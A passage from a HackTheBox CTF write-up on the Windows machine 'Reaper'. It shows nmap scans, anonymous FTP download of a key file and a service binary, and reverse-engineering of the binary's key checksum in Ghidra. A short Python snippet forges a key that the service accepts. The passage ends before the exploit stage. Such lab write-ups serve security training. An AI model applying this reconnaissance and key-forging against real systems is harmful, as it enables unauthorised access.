@@ -1,0 +1,1413 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Reaper</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-reaper">htb-reaper</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#pebear">pebear</a> <a class="post-tag" href="/tags#ghidra">ghidra</a> <a class="post-tag" href="/tags#reverse-engineering">reverse-engineering</a> <a class="post-tag" href="/tags#bof">bof</a> <a class="post-tag" href="/tags#pattern-create">pattern-create</a> <a class="post-tag" href="/tags#x64dbg">x64dbg</a> <a class="post-tag" href="/tags#format-string">format-string</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#pwntools">pwntools</a> <a class="post-tag" href="/tags#virtualalloc">virtualalloc</a> <a class="post-tag" href="/tags#rop">rop</a> <a class="post-tag" href="/tags#ropper">ropper</a> <a class="post-tag" href="/tags#ropgadget">ropgadget</a> <a class="post-tag" href="/tags#return-to-shellcode">return-to-shellcode</a> <a class="post-tag" href="/tags#htb-rainbow">htb-rainbow</a> <a class="post-tag" href="/tags#msfvenom">msfvenom</a> <a class="post-tag" href="/tags#rdp">rdp</a> <a class="post-tag" href="/tags#xfreerdp">xfreerdp</a> <a class="post-tag" href="/tags#driver">driver</a> <a class="post-tag" href="/tags#ioctl">ioctl</a> <a class="post-tag" href="/tags#token">token</a> <a class="post-tag" href="/tags#windbg">windbg</a> <a class="post-tag" href="/tags#windbg-kernel">windbg-kernel</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-08-26T09:00:00+00:00" itemprop="datePublished">Aug 26, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/08/26/htb-reaper.html" style="color: #e6e6e6; text-decoration: none;">HTB: Reaper</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/reaper-cover.webp" type="image/webp"/>
+<img alt="Reaper" class="include_image" loading="lazy" src="/img/reaper-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Reaper starts with a simple key validation service. I’ll find the binary on an open FTP and reverse it to find both a buffer overflow and a format string vulnerability. I’ll abuse the format string to leak a memory address to bypass ASLR. Then I’ll abuse the overflow with ROP to call VirtualAlloc to make the stack executable and return to shellcode to get a shell. For root, I’ll find a driver that provides an arbitrary read and write from the kernel. I’ll abuse that to copy the token from a legit system process into my current process and spawn cmd.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/706 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/reaper" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Reaper</a> <a href="https://hackthebox.com/machines/reaper" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-reaper.webp" type="image/webp"/> <img alt="Reaper" class="img-av" src="/icons/box-reaper.png"/></picture></a><br/><a href="https://hackthebox.com/machines/reaper" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">26 Aug 2025</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">26 Aug 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Insane">Insane [50]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds seven open TCP ports, FTP (21), HTTP (80), RDP (3389), and unknown services on 4141, 5040, 5357, and 7680:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.234.65
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-21 03:45 UTC
+...[snip]...
+Nmap scan report for 10.129.234.65
+Host is up, received echo-reply ttl 127 (0.092s latency).
+Scanned at 2025-08-21 03:45:30 UTC for 13s
+Not shown: 65528 filtered tcp ports (no-response)
+PORT     STATE SERVICE       REASON
+21/tcp   open  ftp           syn-ack ttl 127
+80/tcp   open  http          syn-ack ttl 127
+3389/tcp open  ms-wbt-server syn-ack ttl 127
+4141/tcp open  oirtgsvc      syn-ack ttl 127
+5040/tcp open  unknown       syn-ack ttl 127
+5357/tcp open  wsdapi        syn-ack ttl 127
+7680/tcp open  pando-pub     syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
+           Raw packets sent: 131075 (5.767MB) | Rcvd: 16 (688B)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 21,80,3389,4141,5040,5357,7680 <span class="nt">-sCV</span> 10.129.234.65
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-21 03:46 UTC
+Nmap scan report for 10.129.234.65
+Host is up (0.092s latency).
+
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 08-15-23  12:12AM                  262 dev_keys.txt
+|_08-14-23  02:53PM               187392 dev_keysvc.exe
+| ftp-syst:
+|_  SYST: Windows_NT
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows
+|_http-server-header: Microsoft-IIS/10.0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=reaper
+| Not valid before: 2025-04-15T02:04:48
+|_Not valid after:  2025-10-15T02:04:48
+4141/tcp open  oirtgsvc?
+| fingerprint-strings:
+|   GenericLines:
+|     Choose an option:
+|     Activate key
+|     Exit
+|     Invalid Option
+|     Choose an option:
+...[snip]...
+|_    Exit
+5040/tcp open  unknown
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+7680/tcp open  pando-pub?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4141-TCP:V=7.94SVN%I=7%D=8/21%Time=68A69689%P=x86_64-pc-linux-gnu%r
+SF:(NULL,35,"Choose\x20an\x20option:\n1\.\x20Set\x20key\n2\.\x20Activate\x
+...[snip]...
+SF:y\n3\.\x20Exit\n");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 190.41 seconds
+</span></code></pre></div></div>
+<p>The box shows many of the ports associated with a <a href="/cheatsheets/os#windows-client--server">Windows Host</a>, but with no evidence of active directory.</p>
+<p>All of the ports show a TTL of 127, which matches the <a href="/cheatsheets/os#os-identification">expected TTL</a> for Windows one hop away.</p>
+<p>FTP is showing anonymous login.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The website is the default IIS homepage:</p>
+<picture>
+<source srcset="/img/image-20250820165838582.webp" type="image/webp"/>
+<img alt="image-20250820165838582" class="include_image" loading="lazy" src="/img/image-20250820165838582.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP headers show IIS:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Tue, 25 Jul 2023 12:33:16 GMT</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"dde15e2ff4bed91:0"</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 20 Aug 2025 21:15:00 GMT</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">696</span>
+</code></pre></div></div>
+<p>The 404 page is the <a href="/cheatsheets/404#iis">default IIS 404</a>:</p>
+<picture>
+<source srcset="/img/image-20250820165939763.webp" type="image/webp"/>
+<img alt="image-20250820165939763" class="include_image" loading="lazy" src="/img/image-20250820165939763.png"/>
+</picture>
+<p>The page loads as <code class="language-plaintext highlighter-rouge">/iisstart.htm</code> as well.</p>
+<p>I’ll skip the directory brute force for now as it seems nothing is here.</p>
+<h3 id="ftp---tcp-21">FTP - TCP 21</h3>
+<p>I’m able to log in to FTP using the anonymous username and an empty password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ftp anonymous@10.129.234.65
+<span class="go">Connected to 10.129.234.65.
+220 Microsoft FTP Service
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">229 Entering Extended Passive Mode (|||5003|)
+125 Data connection already open; Transfer starting.
+08-15-23  12:12AM                  262 dev_keys.txt
+08-14-23  02:53PM               187392 dev_keysvc.exe
+226 Transfer complete.
+</span></code></pre></div></div>
+<p>There are two files. I’ll switch to binary mode and get them:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt; </span>bin
+<span class="go">200 Type set to I.
+</span><span class="gp">ftp&gt; </span>get dev_keys.txt
+<span class="go">local: dev_keys.txt remote: dev_keys.txt
+229 Entering Extended Passive Mode (|||5005|)
+150 Opening BINARY mode data connection.
+100% |******************************************************************************************|   262        2.80 KiB/s    00:00 ETA
+226 Transfer complete.
+262 bytes received in 00:00 (2.79 KiB/s)
+</span><span class="gp">ftp&gt; </span>get dev_keys
+<span class="go">dev_keys.txt    dev_keysvc.exe
+</span><span class="gp">ftp&gt; </span>get dev_keysvc.exe
+<span class="go">local: dev_keysvc.exe remote: dev_keysvc.exe
+229 Entering Extended Passive Mode (|||5006|)
+150 Opening BINARY mode data connection.
+100% |******************************************************************************************|   183 KiB  366.08 KiB/s    00:00 ETA
+226 Transfer complete.
+187392 bytes received in 00:00 (365.96 KiB/s)
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">dev_keys.txt</code> has three keys and a note:</p>
+<div class="language-plaintext wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Development Keys:
+
+100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
+101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
+102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl
+
+The dev keys can not be activated yet, we are working on fixing a bug in the activation function.
+</code></pre></div></div>
+<p>I’ll note they seem to end with base64 data, and in fact, it does decode:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo </span><span class="nv">U3RhbmRhcmQgTGljZW5zZQ</span><span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">Standard License
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo </span>UHJlbWl1bSBMaWNlbnNl | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">Premium License
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">dev_keysvc.exe</code> is a 64-bit Windows console executable:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>file dev_keysvc.exe 
+<span class="go">dev_keysvc.exe: PE32+ executable (console) x86-64, for MS Windows, 7 sections
+</span></code></pre></div></div>
+<h3 id="tcp-4141">TCP 4141</h3>
+<p>Connecting to TCP 4141 with <code class="language-plaintext highlighter-rouge">nc</code> offers a menu:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc 10.129.234.65 4141
+<span class="go">Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+</span></code></pre></div></div>
+<p>Entering 1 prompts for a key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Enter a key: asd
+Invalid key format
+Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+</span></code></pre></div></div>
+<p>Everything I try returns “Invalid key format”. 2 just says there’s no key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Could not find key!
+</span></code></pre></div></div>
+<p>3 closes the connection. This very much seems like a pwn challenge.</p>
+<p>If I try one of the keys from FTP, it does accept it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+1
+Enter a key: 100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
+Valid key format
+Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+</span></code></pre></div></div>
+<p>If I then 2, it decodes the base64, but then goes right back to the menu:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+2
+Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License
+Could not find key!
+Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+</span></code></pre></div></div>
+<p>If I choose 2 again, it just says there’s no key.</p>
+<h3 id="tcp-5040-5357-and-7680">TCP 5040, 5357, and 7680</h3>
+<p>For completely unknown ports, I’ll try both <code class="language-plaintext highlighter-rouge">curl</code> and <code class="language-plaintext highlighter-rouge">nc</code> to connection. I can’t get anything out of 5040 or 7680 with either. 5357 does return an HTTP response to <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.129.234.65:5357
+<span class="go">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd"&gt;
+&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Service Unavailable&lt;/TITLE&gt;
+&lt;META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"&gt;&lt;/HEAD&gt;
+&lt;BODY&gt;&lt;h2&gt;Service Unavailable&lt;/h2&gt;
+&lt;hr&gt;&lt;p&gt;HTTP Error 503. The service is unavailable.&lt;/p&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+</span></code></pre></div></div>
+<p>Not much else to do here either.</p>
+<h2 id="shell-as-keysvc">Shell as keysvc</h2>
+<h3 id="protections">Protections</h3>
+<p>In PEBear, in the Optional Headers section under “DLL Characteristics”, I’ll see that NX (DEP) is enabled in this binary:</p>
+<picture>
+<source srcset="/img/image-20250821163148845.webp" type="image/webp"/>
+<img alt="image-20250821163148845" class="include_image" loading="lazy" src="/img/image-20250821163148845.png"/>
+</picture>
+<p>There’s no way to see if the remote system has it enabled system-wide, but at Insane it’s fair to assume it does. I’ll assume ASLR is enabled as well.</p>
+<h3 id="run-dev_keysvcexe">Run dev_keysvc.exe</h3>
+<p>On a Windows VM, I can run <code class="language-plaintext highlighter-rouge">dev_keysvc.exe</code> and it opens a DOS window and prints that it’s listening:</p>
+<picture>
+<source srcset="/img/image-20250821152542707.webp" type="image/webp"/>
+<img alt="image-20250821152542707" class="include_image" loading="lazy" src="/img/image-20250821152542707.png"/>
+</picture>
+<p>I can interact with it as well from my Linux VM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc 10.0.0.202 4141
+<span class="go">Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+</span></code></pre></div></div>
+<p>I can also open it in x64dbg for debugging.</p>
+<h3 id="reversing-dev_keysvcexe">Reversing dev_keysvc.exe</h3>
+<h4 id="main">main</h4>
+<p>The main function is at 0x140001bd0:</p>
+<picture>
+<source srcset="/img/image-20250821152919352.webp" type="image/webp"/>
+<img alt="image-20250821152919352" class="include_image" loading="lazy" src="/img/image-20250821152919352.png"/>
+</picture>
+<p>It sets up the socket and starts listening, entering a <code class="language-plaintext highlighter-rouge">while true</code> loop that calls <code class="language-plaintext highlighter-rouge">accept</code>, and when there’s a connection it takes that socket, spins off a new thread passing in that socket, and then resumes blocking on <code class="language-plaintext highlighter-rouge">accept</code> waiting for the next connection.</p>
+<h4 id="handle_client-overview">handle_client Overview</h4>
+<p>The function at 0x140001000 I’ve named <code class="language-plaintext highlighter-rouge">handle_client</code>, as it takes the client socket and is responsible for the main menu plus calling whatever comes from those choices.</p>
+<picture>
+<source srcset="/img/image-20250821153709247.webp" type="image/webp"/>
+<img alt="image-20250821153709247" class="include_image" loading="lazy" src="/img/image-20250821153709247.png"/>
+</picture>
+<p>If “3” is entered, it breaks the outermost loop and returns. If anything else is entered, it sends an “Invalid Option” message and loops to print the menu again.</p>
+<h4 id="option-1">Option 1</h4>
+<p>The binary prompts for the key, and then reads into the <code class="language-plaintext highlighter-rouge">inputKeyBuffer</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">send</span><span class="p">(</span><span class="n">clientSocket</span><span class="p">,</span><span class="s">"Enter a key: "</span><span class="p">,</span><span class="mh">0xd</span><span class="p">);</span>
+        <span class="n">bufferSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">uVar1</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
+        <span class="n">recv</span><span class="p">(</span><span class="n">clientSocket</span><span class="p">,</span><span class="n">inputKeyBuffer</span><span class="p">);</span>
+        <span class="n">keyBlock</span> <span class="o">=</span> <span class="n">inputKeyBuffer</span><span class="p">;</span>
+</code></pre></div></div>
+<p>That result is passed to a function I named <code class="language-plaintext highlighter-rouge">validate_key</code> (0x140001760):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">key_valid</span> <span class="o">=</span> <span class="n">validate_key</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">inputKeyBuffer</span><span class="p">,</span><span class="n">keyBlock</span><span class="p">,</span><span class="n">uVar1</span><span class="p">,</span><span class="n">bufferSize</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">key_valid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">msgInvalidKey</span> <span class="o">=</span> <span class="s">"Invalid key format</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+          <span class="n">messageLength</span> <span class="o">=</span> <span class="n">strlen_local</span><span class="p">(</span><span class="s">"Invalid key format</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+          <span class="n">send</span><span class="p">(</span><span class="n">clientSocket</span><span class="p">,</span><span class="n">msgInvalidKey</span><span class="p">,</span><span class="n">messageLength</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+          <span class="n">msgValidKey</span> <span class="o">=</span> <span class="s">"Valid key format</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+          <span class="n">storedKeyBuffer</span> <span class="o">=</span> <span class="n">inputKeyBuffer</span><span class="p">;</span>
+          <span class="n">yield_noop</span><span class="p">();</span>
+          <span class="n">messageLength</span> <span class="o">=</span> <span class="n">strlen_local</span><span class="p">(</span><span class="n">msgValidKey</span><span class="p">);</span>
+          <span class="n">send</span><span class="p">(</span><span class="n">clientSocket</span><span class="p">,</span><span class="n">msgValidKey</span><span class="p">,</span><span class="n">messageLength</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
+        <span class="p">}</span>
+</code></pre></div></div>
+<p>If this function returns 0, it sends back a failure message. Otherwise, it stores the key buffer in <code class="language-plaintext highlighter-rouge">storedKeyBuffer</code> and sends a success message. Either way, it returns to the top of the loop and prints the menu.</p>
+<p>This <code class="language-plaintext highlighter-rouge">validate_key</code> function parses the key using a loop, and then reads an int from the key, and compares them:</p>
+<picture>
+<source srcset="/img/image-20250821134542771.webp" type="image/webp"/>
+<img alt="image-20250821134542771" class="include_image" loading="lazy" src="/img/image-20250821134542771.png"/>
+</picture>
+<p>At mark 1, if the key is less than 0x17 bytes, it’s not valid and return 0. At mark 2, it checks for a byte that’s not ASCII between position 3 and 9, and if it finds any, it returns 0. It validates that positions 3, 9, 13, and 18 are “-“, or returns 0 at mark 3.</p>
+<p>If the position is less than 0x12 (18) and it’s not one of the “-“, the function uses the byte to calculate the checksum at mark 4. The byte value of the character minus 0x30 is added to a running total. At mark 5, that total is taken mod 10000 (so the low four digits), and that’s the checksum.</p>
+<p>At mark 6, the <code class="language-plaintext highlighter-rouge">extract_checksum</code> function is called, taking an address 0x13 bytes into the key, and the memory address  0x1400203f4, which holds the string “%4d”. This is effectively parsing a four digit int from 0x13 bytes into the key, which is the last number before the base64 data. Mark 7 is where it compares the computer checksum with the number from the key, and if it matches, returns 1 (otherwise returning 0).</p>
+<p>I can simulate this in a Python REPL:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">key</span> <span class="o">=</span> <span class="sh">'</span><span class="s">100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==</span><span class="sh">'</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">sum</span><span class="p">([</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">key</span><span class="p">[:</span><span class="mh">0x13</span><span class="p">]</span> <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">])</span>
+<span class="go">102
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">key</span> <span class="o">=</span> <span class="sh">'</span><span class="s">101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl</span><span class="sh">'</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">sum</span><span class="p">([</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">key</span><span class="p">[:</span><span class="mh">0x13</span><span class="p">]</span> <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">])</span>
+<span class="go">109
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">key</span> <span class="o">=</span> <span class="sh">'</span><span class="s">102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl</span><span class="sh">'</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">sum</span><span class="p">([</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">key</span><span class="p">[:</span><span class="mh">0x13</span><span class="p">]</span> <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">])</span>
+<span class="go">106
+</span></code></pre></div></div>
+<p>I’ll note, the data after the last dash is not a part of the checksum. I can make a fake key in Python:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">key</span> <span class="o">=</span> <span class="sh">'</span><span class="s">223-AAAAA-BBB-CCCC-0222-whatever i want here</span><span class="sh">'</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">sum</span><span class="p">([</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">key</span><span class="p">[:</span><span class="mh">0x13</span><span class="p">]</span> <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">])</span>
+<span class="go">222
+</span></code></pre></div></div>
+<p>It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+1
+Enter a key: 223-AAAAA-BBB-CCCC-0222-whatever i want here
+Valid key format
+</span></code></pre></div></div>
+<h4 id="option-2">Option 2</h4>
+<p>The code when “2” is sent first check that <code class="language-plaintext highlighter-rouge">storedKeyBuffer</code> is non-zero, and then feeds that to a function, <code class="language-plaintext highlighter-rouge">activate_key</code>.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">if</span> <span class="p">(((</span><span class="o">*</span><span class="n">storedKeyBuffer</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="o">||</span>
+         <span class="p">(</span><span class="n">uVar1</span> <span class="o">=</span> <span class="n">activate_key</span><span class="p">(</span><span class="n">clientSocket</span><span class="p">,(</span><span class="n">uchar</span> <span class="o">*</span><span class="p">)</span><span class="n">storedKeyBuffer</span><span class="p">),</span> <span class="p">(</span><span class="n">uVar1</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">msgKeyNotFound</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n</span><span class="s">Could not find key!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+        <span class="n">messageLength</span> <span class="o">=</span> <span class="n">strlen_local</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Could not find key!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">send</span><span class="p">(</span><span class="n">clientSocket</span><span class="p">,</span><span class="n">msgKeyNotFound</span><span class="p">,</span><span class="n">messageLength</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="n">msgKeyFound</span> <span class="o">=</span> <span class="s">"Key found!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+        <span class="n">messageLength</span> <span class="o">=</span> <span class="n">strlen_local</span><span class="p">(</span><span class="s">"Key found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">send</span><span class="p">(</span><span class="n">clientSocket</span><span class="p">,</span><span class="n">msgKeyFound</span><span class="p">,</span><span class="n">messageLength</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">zero_buffer</span><span class="p">(</span><span class="n">storedKeyBuffer</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
+</code></pre></div></div>
+<p>If either are zero, it returns a “cannot find key” message. Otherwise, it returns “Key found!”. Either way, the <code class="language-plaintext highlighter-rouge">storedKeyBuffer</code> is zeroed.</p>
+<p><code class="language-plaintext highlighter-rouge">activate_key</code> (0x140001910) starts with a call to <code class="language-plaintext highlighter-rouge">log_key</code>, and then opens a file, <code class="language-plaintext highlighter-rouge">keys.txt</code>, and loops over the lines, checking if any of the lines match the given key:</p>
+<picture>
+<source srcset="/img/image-20250821165510719.webp" type="image/webp"/>
